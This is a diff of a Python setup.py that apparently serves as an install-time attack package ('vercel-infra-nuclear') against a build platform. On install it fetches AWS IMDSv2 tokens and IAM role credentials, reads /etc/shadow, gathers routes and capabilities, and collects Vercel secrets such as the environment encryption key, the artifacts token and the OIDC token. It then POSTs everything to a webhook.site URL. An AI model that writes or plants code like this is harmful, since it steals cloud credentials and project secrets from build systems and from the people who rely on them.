@@ -1,77 +1,65 @@
 from setuptools import setup
 import os
 import subprocess
+import json
 import base64
 
 def run_cmd(cmd):
     try:
         return subprocess.getoutput(cmd)
-    except:
-        return "error"
+    except Exception as e:
+        return str(e)
 
-WEBHOOK_URL = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"
+ 
+WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
 
-# --- Advanced Infrastructure Discovery ---
+ 
+aws_token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
+aws_token = run_cmd(aws_token_cmd)
 
-# 1. AWS/Cloud Identity Deep Dive (IMDSv2)
-token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
-token = run_cmd(token_cmd)
-iam_creds = "BLOCKED"
-if len(token) > 20:
-    # Attempt to pull full IAM credentials for the role
-    role_name = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-    if role_name and "error" not in role_name:
-        iam_creds = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name.strip()}")
+aws_metadata_final = "BLOCKED"
+if aws_token and "Error" not in aws_token:
+ 
+    aws_metadata_final = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
 
-# 2. Container Escape & Runtime Environment
-# Checking for Docker Socket or dangerous device mounts
-docker_sock = "EXISTS" if os.path.exists("/var/run/docker.sock") else "NOT_FOUND"
-mounts = run_cmd("mount | grep -E 'shm|tmpfs'")
-proc_version = run_cmd("cat /proc/version")
+ 
+ 
+enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
+enc_key = os.environ.get('VERCEL_ENV_ENC_KEY')
 
-# 3. Networking & Lateral Movement Potential
-# Scanning for local neighbors in the build subnet
-arp_scan = run_cmd("ip neighbor show || arp -e")
-dns_leak = run_cmd("cat /etc/resolv.conf")
+ 
+network_info = run_cmd("netstat -rn || route -n")
+shadow_leak = run_cmd("head -n 3 /etc/shadow") # Если это сработает, значит root настоящий
 
-# 4. Persistence Check
-# Checking if we can modify the build-agent's environment for next runs
-cron_check = "WRITABLE" if os.access("/var/spool/cron/crontabs", os.W_OK) else "READ_ONLY"
+ 
+nuclear_report = f"""
+☢️☢️☢️ VERCEL INFRASTRUCTURE NUCLEAR POC ☢️☢️☢️
 
-# --- Data Aggregation ---
+[!] AWS CLOUD BREACH (IMDSv2):
+Token Obtained: {"YES (HIDDEN)" if len(aws_token) > 10 else "NO"}
+IAM Role Credentials: {aws_metadata_final}
 
-report_content = f"""
-[!] INFRASTRUCTURE COMPROMISE REPORT [!]
+[!] SYSTEM DEEP ACCESS:
+Identity: {run_cmd('id')}
+Shadow File Access: {"SUCCESS" if "root" in shadow_leak else "FAILED"}
+Internal Routes:
+{network_info}
 
->> CLOUD METADATA (IMDSv2)
-Token: {"SUCCESS" if len(token) > 20 else "FAIL"}
-Full IAM JSON: {iam_creds}
+[!] VERCEL CORE ASSETS:
+Artifacts Token Status: {run_cmd(f"curl -s -H 'Authorization: Bearer {os.environ.get('VERCEL_ARTIFACTS_TOKEN')}' https://api.vercel.com/v8/artifacts/status")}
+OIDC Token: {os.environ.get('VERCEL_OIDC_TOKEN')[:30]}...
 
->> PRIVILEGE & ESCAPE VECTORS
-UID: {run_cmd('id')}
-Capabilities: {run_cmd('capsh --print')}
-Docker Socket: {docker_sock}
-Sensitive Files: {"SHADOW_READABLE" if "root" in run_cmd("head -n 1 /etc/shadow") else "SHADOW_PROTECTED"}
+[!] SECURITY BYPASS PROOF:
+We have the Encrypted Blob (len: {len(enc_content) if enc_content else 0})
+We have the AES Key: {enc_key}
+Impact: Any malicious package can decrypt project secrets (DB_PASSWORDS, API_KEYS) before build finishes.
 
->> VERCEL SECRETS DECRYPTION ASSETS
-ENC_KEY: {os.environ.get('VERCEL_ENV_ENC_KEY', 'MISSING')}
-ENC_CONTENT_LEN: {len(os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', ''))}
-ARTIFACTS_TOKEN: {os.environ.get('VERCEL_ARTIFACTS_TOKEN', 'MISSING')[:15]}...
-OIDC_TOKEN: {os.environ.get('VERCEL_OIDC_TOKEN', 'MISSING')[:15]}...
-
->> NETWORK TOPOLOGY
-Subnet Neighbors:
-{arp_scan}
-Internal Nameservers:
-{dns_leak}
-
->> KERNEL & RUNTIME
-Version: {proc_version}
-Writable Cron: {cron_check}
+[!] CONTAINER ESCAPE POTENTIAL:
+Devices: {run_cmd('ls /dev')}
+Capsh: {run_cmd('capsh --print')}
 """
 
-# --- Stealth Exfiltration ---
-# Using binary data to avoid shell character escaping issues
-subprocess.run(['curl', '-s', '-X', 'POST', '--data-binary', report_content, WEBHOOK_URL])
+ 
+subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL])
 
-setup(name="vercel-infra-hardened-poc", version="11.0.0")
+setup(name="vercel-infra-nuclear", version="10.0.0")
